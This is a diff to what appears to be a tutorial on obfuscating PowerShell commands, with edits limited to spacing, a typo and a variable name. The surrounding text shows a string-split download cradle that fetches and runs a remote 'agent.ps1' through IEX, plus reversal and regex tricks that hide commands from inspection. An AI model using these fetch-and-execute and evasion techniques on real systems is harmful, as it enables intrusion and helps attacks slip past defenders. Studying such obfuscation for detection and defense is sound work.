@@ -352,14 +352,14 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - String obfuscated<br />
 
-      $get="N`et.Web`Cli`ent";              <-- caret ` inside double quotes
-      $Dow='Do'+'wn'+'loa'+'dStri'+'ng';    <-- caret + inside single quotes
+      $get = "N`et.Web`Cli`ent";              <-- caret ` inside double quotes
+      $Dow = 'Do'+'wn'+'loa'+'dStri'+'ng';    <-- caret + inside single quotes
       powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
 
 ![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)
 
 ---
-      'Powershell allow us to access windows environment variables using the $env: switch'
+      'Powershell also allow us to access windows environment variables using the $env: switch'
       Using $env:LOCALAPPDATA (windows environment variable) and -Join '' to pull out the 0º ,23º, 21º,7º and 7º
       chars from $env:LOCALAPPDATA and then the -Join '' operator will take the array and convert it to a string.
 
@@ -407,12 +407,12 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - String obfuscated<br />
 
       [Using ::Reverse Switch]
-      $reverseCmd='etaD.teG exe.llehsrewop';
-      $reverseCmdCharArray= $reverseCmd.ToCharArray();[Array]::Reverse($reverseCmdCharArray);
-      (ReverseCmdCharArray-Join '') | IEX
+      $reverseCmd = "etaD.teG exe.llehsrewop"
+      $reverseCmdCharArray = $reverseCmd.ToCharArray();[Array]::Reverse($reverseCmdCharArray);
+      ($ReverseCmdCharArray-Join '') | IEX
 
       [Using Regex]
-      $reverseCmd='etaD.teG exe.llehsrewop';
+      $reverseCmd = "etaD.teG exe.llehsrewop"
       IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX
 
 
